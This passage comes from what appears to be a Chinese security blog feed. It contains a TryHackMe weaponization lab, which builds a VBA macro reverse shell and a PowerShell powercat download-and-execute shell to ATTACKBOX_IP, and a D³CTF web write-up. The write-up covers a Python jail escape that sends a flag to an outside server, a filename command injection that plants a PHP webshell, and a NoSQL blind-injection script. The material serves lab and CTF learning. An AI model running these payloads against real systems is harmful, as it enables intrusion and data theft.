from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of vba file: 2698 bytes</span><br></pre></td></tr></table></figure><p><strong>导入以注意</strong>需要进行一项修改才能使此工作正常进行。输出将在 MS Excel 工作表上工作。因此，将 Workbook_Open()更改为 Document_Open()以使其适用于 MS word 文档。</p><p>然后把生成的代码写到word的宏编辑器里边</p><p>然后设置监听器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole -q</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 10.50.159.15</span><br><span class="line">LHOST =&gt; 10.50.159.15</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.50.159.15:443 </span><br></pre></td></tr></table></figure><p>一旦在受害者机器上打开恶意  word 文档，我们应该会收到一个反向 shell。</p><h3 id="PowerShell-PSH"><a href="#PowerShell-PSH" class="headerlink" title="PowerShell-PSH"></a>PowerShell-PSH</h3><p><strong>Powershell 是使用 .NET 框架构建的 Windows 脚本语言和 shell 环境</strong>。</p><p>这也允许 Powershell 直接从其 shell 执行 .NET 函数。大多数 Powershell 命令（称为<em>cmdlet）</em>是用 .NET 编写的。<em>与其他脚本语言和 shell 环境不同，这些cmdlet</em>的输出 是对象——使 Powershell 有点面向对象。这也意味着运行 cmdlet 允许您对输出对象执行操作（这样可以方便地将输出从一个<em>cmdlet</em>传递 到另一个）。<em>cmdlet</em>的正常格式使用<strong>Verb-Noun</strong>表示；例如，用于列出命令的<em>cmdlet</em> 被称为<code>Get-Command.</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Write-Output &quot;Welcome to the Weaponization Room!&quot;</span><br></pre></td></tr></table></figure><p>将文件另存为 thm.ps1 。 使用 Write-Output ，我们打印消息“Welcome to the Weaponization Room!” 到命令提示符。 现在让我们运行它并查看结果</p><p><img src="../images/image-20230514205635490.png" alt="image-20230514205635490"></p><p>PowerShell 的执行策略是一个 安全选项，用于保护系统免于运行恶意脚本。默认情况下，Microsoft出于安全目的禁止执行PowerShell脚本.ps1 。PowerShell执行策略设置为Restricted ，这意味着它允许单独的命令但不允许运行任何脚本</p><p><strong>bypass绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt;powershell -ex bypass -File thm.ps1</span><br><span class="line">Welcome to Weaponization Room!</span><br></pre></td></tr></table></figure><p>现在，让我们尝试使用一种用PowerShell编写的工具powercat来获取反向 shell 。在你的 AttackBox 上，从 GitHub 下载它并运行一个网络服务器来传送有效载荷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/besimorhino/powercat.git</span><br></pre></td></tr></table></figure><p>现在，我们需要在该 AttackBox 上设置一个 Web 服务器来为将在目标机器上下载和执行的powercat.ps1提供服务。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在我们的例子中，我们将使用端口 8080 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ cd powercat</span><br><span class="line">user@machine$ python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br></pre></td></tr></table></figure><p>在 AttackBox 上，我们需要使用nc监听端口1337以接收来自受害者的连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@machine$ nc -lvp 1337</span><br></pre></td></tr></table></figure><p>现在，我们从受害机器上下载有效载荷并使用PowerShell有效载荷执行它，如下所示，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\thm\Desktop&gt; powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#x27;http://ATTACKBOX_IP:8080/powercat.ps1&#x27;);powercat -c ATTACKBOX_IP -p 1337 -e cmd&quot;</span><br></pre></td></tr></table></figure><p>现在我们已经执行了上面的命令，受害者机器从我们的网络服务器（在 AttackBox 上）下载 powercat.ps1有效载荷，然后使用cmd.exe 在目标本地执行它，并将连接发送回正在侦听的 AttackBox在端口1337上。几秒钟后，我们应该收到连接回调：</p><p><img src="../images/image-20230514211059473.png" alt="image-20230514211059473"></p><p><strong>HTA VBA powershell</strong>  这三种方式可以进行shell的反弹   在windows系统里</p><p>前两个使用mvf进行生成payload  后面一个是依靠github上面的一个文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前两个是 VBScript 代码  和  HTA代码&lt;/p&gt;
&lt;p&gt;前者是可以在本地上运行，后者是可以弹shell也可以在本地运行&lt;/p&gt;
&lt;h3 id=&quot;应用程序的-Visual-Basic-VBA&quot;&gt;&lt;a href=&quot;#应用程序的-Visual-Basic-VBA&quot; c</summary>
      
    
    
    
    
    <category term="thm-红队-初始访问-武器化" scheme="https://ke1nys.github.io/tags/thm-%E7%BA%A2%E9%98%9F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE-%E6%AD%A6%E5%99%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>AntCTF x D³CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/d27bfad9.html"/>
    <id>https://ke1nys.github.io/posts/d27bfad9.html</id>
    <published>2023-05-02T07:30:06.000Z</published>
    <updated>2023-05-07T09:40:34.530Z</updated>
    
    <content type="html"><![CDATA[<p>这里的复现都是去网上搜索前几名发的wp来复现的</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">亚军wp</a></p><p>还有参考 <a href="https://boogipop.com/">boogipop的wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>题目</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> 题目还给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的话就是自己想方法进行绕过了</p><p>最后是在eval这里进行代码的执行</p><p>因为关键函数被禁了，那么我们可以尝试使用全角符号进行绕过</p><p>迷你上标和下标（0~9、字母、特殊字符）</p><p>用上面的迷你上标或全角符号能能绕过，本地测试过了</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">参考文章</a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>给的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>然后上面执行的是python的shell反弹</p><p>然后就可以在自己的服务器上接收到了</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>题目</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>这里<code>url/admin</code>访问后台，然后弱密码 admin/admin 进行登录</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>发现这文件后，然后进行读取   进行题目的提示和官方文件的对比之后发现多了下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>就是多了这段代码，和题目说的增加了有个新功能相对应</p><p><strong>这里的话是有有个自动解压的功能，那么我们就可以尝试在这里的把自己想要的命令放进压缩包里，然后解压到自己设置的目录下</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>题目这里也给提示了，就是去找解压的函数方法那边</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>里面的这段代码是获取文件后缀的</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>这里的目的是把一句话木马写进来</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>能进行判断通过</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>这里的话就得在文件名出写码了</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>随便上传一个zip文件并抓包</p><p>内容随便</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>这个代码的意思是将base64解码后，然后用bash命令进行执行</p><p><code>echo &#39;&lt;?php eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>这就是等会执行的命令</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>成功进行执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>这段代码就是把上传文件的压缩文件的地址给解压到当前地址</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>这个1.zip处就是我们可控的文件名，然后就可以利用分号隔开，然后进行我们想要执行的其他命令了</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>题目</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>查看第一个hint后，发现是nosql注入里的<strong>MongoDB</strong>注入</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql 注入从零到一</a></p><p>可以从这篇文章来进行学习</p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>输入过滤的词会输出Hacker</p><p>输入错误的密码是会输出下面的东西</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>使用<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>但是这个方法登录的不是admin用户</strong></p><p><strong>这个就是对密码的正则匹配，这里的话是使用通配符来匹配</strong>(上面给的nosql的文章里讲的很清楚这个正则匹配)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>这个也行，就是</p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就跟据invalid的出现的标志来判断密码</p><p>最好爆出密码为  <code>dob2xdriaqpytdyh6jo3</code></p><p>然后进行登录</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>查看源码后发现第二个hint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>然后测试了一下是在这个目录下可以进行文件的读取 (<strong>这里会测试时因为提示给的代码中有filename这个参数</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>不给读取，然后就尝试绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>这段代码使用了一个JavaScript对象来表示文件路径。其中，”filename”是该对象的属性名，” [href]”、”[origin]”、”[protocol]”、”[hostname]”和”[pathname]”则是该属性下的子属性。具体 来说，它们分别表示文件的链接地址、来源、协议、主机名和文件路径。 这里的%2561其实就是。如果有非ascii进行url加密，则就会变成16进制然后再进行url编码，a的16进 制是61</p><p><strong>其实就是对a进行两次url编码</strong></p><p>然后就可以成功的查看到app.js了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span 